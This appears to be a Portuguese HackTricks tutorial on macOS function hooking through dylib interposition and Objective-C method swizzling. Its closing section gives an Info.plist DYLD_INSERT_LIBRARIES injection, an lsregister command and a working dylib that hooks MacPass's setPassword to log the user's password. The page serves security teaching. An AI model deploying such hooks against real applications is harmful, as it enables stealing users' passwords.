# macOS Function Hooking

{{#include ../../../banners/hacktricks-training.md}}

## Interposição de Função

Crie um **dylib** com uma seção **`__interpose` (`__DATA___interpose`)** (ou uma seção marcada com **`S_INTERPOSING`**) contendo tuplas de **ponteiros de função** que se referem às funções **originais** e **substitutas**.

Em seguida, **injete** o dylib com **`DYLD_INSERT_LIBRARIES`** (a interposição precisa ocorrer antes do carregamento do aplicativo principal). Obviamente, as [**restrições** aplicadas ao uso de **`DYLD_INSERT_LIBRARIES`** se aplicam aqui também](macos-library-injection/#check-restrictions).

### Interpor printf

{{#tabs}}
{{#tab name="interpose.c"}}
```c:interpose.c" overflow="wrap
// gcc -dynamiclib interpose.c -o interpose.dylib
#include <stdio.h>
#include <stdarg.h>

int my_printf(const char *format, ...) {
//va_list args;
//va_start(args, format);
//int ret = vprintf(format, args);
//va_end(args);

int ret = printf("Hello from interpose\n");
return ret;
}

__attribute__((used)) static struct { const void *replacement; const void *replacee; } _interpose_printf
__attribute__ ((section ("__DATA,__interpose"))) = { (const void *)(unsigned long)&my_printf, (const void *)(unsigned long)&printf };
```
{{#endtab}}

{{#tab name="hello.c"}}
```c
//gcc hello.c -o hello
#include <stdio.h>

int main() {
printf("Hello World!\n");
return 0;
}
```
{{#endtab}}

{{#tab name="interpose2.c"}}
```c
// Just another way to define an interpose
// gcc -dynamiclib interpose2.c -o interpose2.dylib

#include <stdio.h>

#define DYLD_INTERPOSE(_replacement, _replacee) \
__attribute__((used)) static struct { \
const void* replacement; \
const void* replacee; \
} _interpose_##_replacee __attribute__ ((section("__DATA, __interpose"))) = { \
(const void*) (unsigned long) &_replacement, \
(const void*) (unsigned long) &_replacee \
};

int my_printf(const char *format, ...)
{
int ret = printf("Hello from interpose\n");
return ret;
}

DYLD_INTERPOSE(my_printf,printf);
```
{{#endtab}}
{{#endtabs}}
```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./hello
Hello from interpose

DYLD_INSERT_LIBRARIES=./interpose2.dylib ./hello
Hello from interpose
```
> [!WARNING]
> A variável de ambiente **`DYLD_PRINT_INTERPOSTING`** pode ser usada para depurar a interposição e imprimirá o processo de interposição.

Além disso, note que **a interposição ocorre entre o processo e as bibliotecas carregadas**, não funciona com o cache de bibliotecas compartilhadas.

### Interposição Dinâmica

Agora também é possível interpor uma função dinamicamente usando a função **`dyld_dynamic_interpose`**. Isso permite interpor programaticamente uma função em tempo de execução em vez de fazê-lo apenas desde o início.

Basta indicar as **tuplas** da **função a ser substituída e a função de substituição**.
```c
struct dyld_interpose_tuple {
const void* replacement;
const void* replacee;
};
extern void dyld_dynamic_interpose(const struct mach_header* mh,
const struct dyld_interpose_tuple array[], size_t count);
```
## Method Swizzling

Em ObjectiveC, um método é chamado assim: **`[myClassInstance nameOfTheMethodFirstParam:param1 secondParam:param2]`**

É necessário o **objeto**, o **método** e os **params**. E quando um método é chamado, uma **msg é enviada** usando a função **`objc_msgSend`**: `int i = ((int (*)(id, SEL, NSString *, NSString *))objc_msgSend)(someObject, @selector(method1p1:p2:), value1, value2);`

O objeto é **`someObject`**, o método é **`@selector(method1p1:p2:)`** e os argumentos são **value1**, **value2**.

Seguindo as estruturas de objeto, é possível acessar um **array de métodos** onde os **nomes** e **ponteiros** para o código do método estão **localizados**.

> [!CAUTION]
> Note que, como os métodos e classes são acessados com base em seus nomes, essas informações são armazenadas no binário, então é possível recuperá-las com `otool -ov </path/bin>` ou [`class-dump </path/bin>`](https://github.com/nygard/class-dump)

### Accessing the raw methods

É possível acessar as informações dos métodos, como nome, número de params ou endereço, como no seguinte exemplo:
```objectivec
// gcc -framework Foundation test.m -o test

#import <Foundation/Foundation.h>
#import <objc/runtime.h>
#import <objc/message.h>

int main() {
// Get class of the variable
NSString* str = @"This is an example";
Class strClass = [str class];
NSLog(@"str's Class name: %s", class_getName(strClass));

// Get parent class of a class
Class strSuper = class_getSuperclass(strClass);
NSLog(@"Superclass name: %@",NSStringFromClass(strSuper));

// Get information about a method
SEL sel = @selector(length);
NSLog(@"Selector name: %@", NSStringFromSelector(sel));
Method m = class_getInstanceMethod(strClass,sel);
NSLog(@"Number of arguments: %d", method_getNumberOfArguments(m));
NSLog(@"Implementation address: 0x%lx", (unsigned long)method_getImplementation(m));

// Iterate through the class hierarchy
NSLog(@"Listing methods:");
Class currentClass = strClass;
while (currentClass != NULL) {
unsigned int inheritedMethodCount = 0;
Method* inheritedMethods = class_copyMethodList(currentClass, &inheritedMethodCount);

NSLog(@"Number of inherited methods in %s: %u", class_getName(currentClass), inheritedMethodCount);

for (unsigned int i = 0; i < inheritedMethodCount; i++) {
Method method = inheritedMethods[i];
SEL selector = method_getName(method);
const char* methodName = sel_getName(selector);
unsigned long address = (unsigned long)method_getImplementation(m);
NSLog(@"Inherited method name: %s (0x%lx)", methodName, address);
}

// Free the memory allocated by class_copyMethodList
free(inheritedMethods);
currentClass = class_getSuperclass(currentClass);
}

// Other ways to call uppercaseString method
if([str respondsToSelector:@selector(uppercaseString)]) {
NSString *uppercaseString = [str performSelector:@selector(uppercaseString)];
NSLog(@"Uppercase string: %@", uppercaseString);
}

// Using objc_msgSend directly
NSString *uppercaseString2 = ((NSString *(*)(id, SEL))objc_msgSend)(str, @selector(uppercaseString));
NSLog(@"Uppercase string: %@", uppercaseString2);

// Calling the address directly
IMP imp = method_getImplementation(class_getInstanceMethod(strClass, @selector(uppercaseString))); // Get the function address
NSString *(*callImp)(id,SEL) = (typeof(callImp))imp; // Generates a function capable to method from imp
NSString *uppercaseString3 = callImp(str,@selector(uppercaseString)); // Call the method
NSLog(@"Uppercase string: %@", uppercaseString3);

return 0;
}
```
### Troca de Métodos com method_exchangeImplementations

A função **`method_exchangeImplementations`** permite **mudar** o **endereço** da **implementação** de **uma função pela outra**.

> [!CAUTION]
> Assim, quando uma função é chamada, o que é **executado é a outra**.
```objectivec
//gcc -framework Foundation swizzle_str.m -o swizzle_str

#import <Foundation/Foundation.h>
#import <objc/runtime.h>


// Create a new category for NSString with the method to execute
@interface NSString (SwizzleString)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from;

@end

@implementation NSString (SwizzleString)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from {
NSLog(@"Custom implementation of substringFromIndex:");

// Call the original method
return [self swizzledSubstringFromIndex:from];
}

@end

int main(int argc, const char * argv[]) {
// Perform method swizzling
Method originalMethod = class_getInstanceMethod([NSString class], @selector(substringFromIndex:));
Method swizzledMethod = class_getInstanceMethod([NSString class], @selector(swizzledSubstringFromIndex:));
method_exchangeImplementations(originalMethod, swizzledMethod);

// We changed the address of one method for the other
// Now when the method substringFromIndex is called, what is really called is swizzledSubstringFromIndex
// And when swizzledSubstringFromIndex is called, substringFromIndex is really colled

// Example usage
NSString *myString = @"Hello, World!";
NSString *subString = [myString substringFromIndex:7];
NSLog(@"Substring: %@", subString);

return 0;
}
```
> [!WARNING]
> Neste caso, se o **código de implementação do legit** método **verificar** o **nome** do **método**, ele pode **detectar** esse swizzling e impedir que ele seja executado.
>
> A técnica a seguir não tem essa restrição.

### Method Swizzling com method_setImplementation

O formato anterior é estranho porque você está trocando a implementação de 2 métodos um pelo outro. Usando a função **`method_setImplementation`**, você pode **mudar** a **implementação** de um **método para o outro**.

Apenas lembre-se de **armazenar o endereço da implementação do original** se você for chamá-lo a partir da nova implementação antes de sobrescrevê-lo, porque depois será muito mais complicado localizar esse endereço.
```objectivec
#import <Foundation/Foundation.h>
#import <objc/runtime.h>
#import <objc/message.h>

static IMP original_substringFromIndex = NULL;

@interface NSString (Swizzlestring)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from;

@end

@implementation NSString (Swizzlestring)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from {
NSLog(@"Custom implementation of substringFromIndex:");

// Call the original implementation using objc_msgSendSuper
return ((NSString *(*)(id, SEL, NSUInteger))original_substringFromIndex)(self, _cmd, from);
}

@end

int main(int argc, const char * argv[]) {
@autoreleasepool {
// Get the class of the target method
Class stringClass = [NSString class];

// Get the swizzled and original methods
Method originalMethod = class_getInstanceMethod(stringClass, @selector(substringFromIndex:));

// Get the function pointer to the swizzled method's implementation
IMP swizzledIMP = method_getImplementation(class_getInstanceMethod(stringClass, @selector(swizzledSubstringFromIndex:)));

// Swap the implementations
// It return the now overwritten implementation of the original method to store it
original_substringFromIndex = method_setImplementation(originalMethod, swizzledIMP);

// Example usage
NSString *myString = @"Hello, World!";
NSString *subString = [myString substringFromIndex:7];
NSLog(@"Substring: %@", subString);

// Set the original implementation back
method_setImplementation(originalMethod, original_substringFromIndex);

return 0;
}
}
```
## Metodologia de Ataque por Hooking

Nesta página, diferentes maneiras de hookear funções foram discutidas. No entanto, elas envolviam **executar código dentro do processo para atacar**.

Para fazer isso, a técnica mais fácil de usar é injetar um [Dyld via variáveis de ambiente ou sequestro](macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md). No entanto, eu acho que isso também poderia ser feito via [injeção de processo Dylib](macos-ipc-inter-process-communication/#dylib-process-injection-via-task-port).

No entanto, ambas as opções são **limitadas** a binários/processos **não protegidos**. Verifique cada técnica para aprender mais sobre as limitações.

No entanto, um ataque de hooking de função é muito específico, um atacante fará isso para **roubar informações sensíveis de dentro de um processo** (se não, você apenas faria um ataque de injeção de processo). E essas informações sensíveis podem estar localizadas em aplicativos baixados pelo usuário, como o MacPass.

Assim, o vetor do atacante seria encontrar uma vulnerabilidade ou remover a assinatura da aplicação, injetar a variável de ambiente **`DYLD_INSERT_LIBRARIES`** através do Info.plist da aplicação adicionando algo como:
```xml
<key>LSEnvironment</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/Applications/Application.app/Contents/malicious.dylib</string>
</dict>
```
e então **re-registre** o aplicativo:
```bash
/System/Library/Frameworks/CoreServices.framework/Frameworks/LaunchServices.framework/Support/lsregister -f /Applications/Application.app
```
Adicione nesse biblioteca o código de hooking para exfiltrar as informações: Senhas, mensagens...

> [!CAUTION]
> Note que em versões mais recentes do macOS, se você **remover a assinatura** do binário da aplicação e ele foi executado anteriormente, o macOS **não executará mais a aplicação**.

#### Exemplo de biblioteca
```objectivec
// gcc -dynamiclib -framework Foundation sniff.m -o sniff.dylib

// If you added env vars in the Info.plist don't forget to call lsregister as explained before

// Listen to the logs with something like:
// log stream --style syslog --predicate 'eventMessage CONTAINS[c] "Password"'

#include <Foundation/Foundation.h>
#import <objc/runtime.h>

// Here will be stored the real method (setPassword in this case) address
static IMP real_setPassword = NULL;

static BOOL custom_setPassword(id self, SEL _cmd, NSString* password, NSURL* keyFileURL)
{
// Function that will log the password and call the original setPassword(pass, file_path) method
NSLog(@"[+] Password is: %@", password);

// After logging the password call the original method so nothing breaks.
return ((BOOL (*)(id,SEL,NSString*, NSURL*))real_setPassword)(self, _cmd,  password, keyFileURL);
}

// Library constructor to execute
__attribute__((constructor))
static void customConstructor(int argc, const char **argv) {
// Get the real method address to not lose it
Class classMPDocument = NSClassFromString(@"MPDocument");
Method real_Method = class_getInstanceMethod(classMPDocument, @selector(setPassword:keyFileURL:));

// Make the original method setPassword call the fake implementation one
IMP fake_IMP = (IMP)custom_setPassword;
real_setPassword = method_setImplementation(real_Method, fake_IMP);
}
```
## Referências

- [https://nshipster.com/method-swizzling/](https://nshipster.com/method-swizzling/)

{{#include ../../../banners/hacktricks-training.md}}
